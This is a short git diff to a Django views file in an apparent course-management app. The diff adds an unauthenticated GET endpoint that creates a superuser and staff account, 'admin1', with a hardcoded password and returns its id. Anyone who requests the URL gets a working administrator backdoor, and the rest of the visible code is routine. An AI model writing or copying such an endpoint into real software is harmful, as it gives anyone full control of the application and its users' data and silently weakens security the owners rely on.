@@ -19,6 +19,14 @@ from courselayout.models import format_type, single_activity_type, single_activi
 # Create your views here.
 
 @api_view(['GET'])				
+def createsuperuser(request):	
+			user=User.objects.create_user('admin1', password='Demo@123')
+			user.is_superuser=True
+			user.is_staff=True
+			user.save()
+			return HttpResponse(json.dumps({"responce code":"100","status": "success" ,"user" : user.id}), content_type="application/json")
+			
+@api_view(['GET'])			
 def getcourseformats(request):	
 			cformat= format_type.objects.filter(isActive = "1")
 			courseformat = []
